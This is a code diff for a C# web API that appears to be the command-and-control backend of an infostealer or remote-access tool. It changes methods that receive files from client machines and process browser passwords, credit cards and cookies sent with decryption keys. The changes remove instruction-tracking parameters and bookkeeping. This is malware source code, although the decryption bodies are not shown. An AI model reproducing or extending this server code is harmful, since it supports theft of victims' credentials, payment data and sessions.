@@ -85,10 +85,10 @@ namespace X_ZIGZAG_SERVER_WEB_API.Services
                 }
             }*/
         }
-        public async Task StoreFile(string uuid,long instructionId,IFormFile file)
+        public async Task StoreFile(string uuid,IFormFile file)
         {
-            var InstructionGet = await _context.Instructions.Where(inst => inst.ClientId.Equals(uuid) && inst.InstructionId.Equals(instructionId)).FirstOrDefaultAsync();
-            if (InstructionGet!=null)
+            var CheckUUID = await _context.SystemsInfo.AnyAsync(u => u.Id.Equals(uuid));
+            if (CheckUUID)
             {
                 var uploadsFolder = Path.Combine(Directory.GetCurrentDirectory(), "Uploads", uuid);
                 Directory.CreateDirectory(uploadsFolder);
@@ -97,16 +97,6 @@ namespace X_ZIGZAG_SERVER_WEB_API.Services
                 {
                     await file.CopyToAsync(stream);
                 }
-                var result = new Result
-                {
-                    ClientId = uuid,
-                    InstructionId = instructionId,
-                    Code = InstructionGet.Code,
-                    ResultDate= DateTimeOffset.UtcNow,
-                    FunctionArgs=InstructionGet.FunctionArgs,
-                };
-                await _context.Results.AddAsync(result);
-                _context.Remove(InstructionGet);
                 await _context.SaveChangesAsync();
             }
         }
@@ -124,19 +114,12 @@ namespace X_ZIGZAG_SERVER_WEB_API.Services
             await _context.Results.AddAsync(result);
             await _context.SaveChangesAsync();
         }
-        public async Task BrowserPasswordExtracting(string uuid, long instructionId, byte[] file, byte[] secretKey,string BrowserName)
+        public async Task BrowserPasswordExtracting(string uuid, byte[] file, byte[] secretKey,string BrowserName)
         {
             var checkIfUserExist = await _context.CheckSettings.AnyAsync(u=>u.Id.Equals(uuid));
             if (!checkIfUserExist)
             {
                 return;
-            }
-           
-            var InstructionGet = await _context.Instructions.Where(inst => inst.ClientId.Equals(uuid) && inst.InstructionId.Equals(instructionId)).FirstOrDefaultAsync();
-            if (InstructionGet != null)
-            {
-                _context.Instructions.Remove(InstructionGet);
-                await _context.SaveChangesAsync();
             }
             string tempFilePath = Path.GetTempFileName();
             using (FileStream fs = new FileStream(tempFilePath, FileMode.Create, FileAccess.Write))
@@ -191,7 +174,7 @@ namespace X_ZIGZAG_SERVER_WEB_API.Services
                 await _context.SaveChangesAsync();
             }
         }
-        public async Task BrowserCreditCardExtracting(string uuid, long instructionId, byte[] file, byte[] secretKey, string BrowserName)
+        public async Task BrowserCreditCardExtracting(string uuid, byte[] file, byte[] secretKey, string BrowserName)
         {
             var checkIfUserExist = await _context.CheckSettings.AnyAsync(u => u.Id.Equals(uuid));
             if (!checkIfUserExist)
@@ -199,12 +182,7 @@ namespace X_ZIGZAG_SERVER_WEB_API.Services
                 return;
             }
 
-            var InstructionGet = await _context.Instructions.Where(inst => inst.ClientId.Equals(uuid) && inst.InstructionId.Equals(instructionId)).FirstOrDefaultAsync();
-            if (InstructionGet != null)
-            {
-                _context.Instructions.Remove(InstructionGet);
-                await _context.SaveChangesAsync();
-            }
+
             string tempFilePath = Path.GetTempFileName();
             using (FileStream fs = new FileStream(tempFilePath, FileMode.Create, FileAccess.Write))
             {
@@ -259,7 +237,7 @@ namespace X_ZIGZAG_SERVER_WEB_API.Services
                 await _context.SaveChangesAsync();
             }
         }
-        public async Task BrowserCookiesExtracting(string uuid, long instructionId, byte[] file, byte[] secretKey, string BrowserName)
+        public async Task BrowserCookiesExtracting(string uuid, byte[] file, byte[] secretKey, string BrowserName)
         {
             var checkIfUserExist = await _context.CheckSettings.AnyAsync(u => u.Id.Equals(uuid));
             if (!checkIfUserExist)
@@ -267,12 +245,7 @@ namespace X_ZIGZAG_SERVER_WEB_API.Services
                 return;
             }
 
-            var InstructionGet = await _context.Instructions.Where(inst => inst.ClientId.Equals(uuid) && inst.InstructionId.Equals(instructionId)).FirstOrDefaultAsync();
-            if (InstructionGet != null)
-            {
-                _context.Instructions.Remove(InstructionGet);
-                await _context.SaveChangesAsync();
-            }
+
             string tempFilePath = Path.GetTempFileName();
             using (FileStream fs = new FileStream(tempFilePath, FileMode.Create, FileAccess.Write))
             {
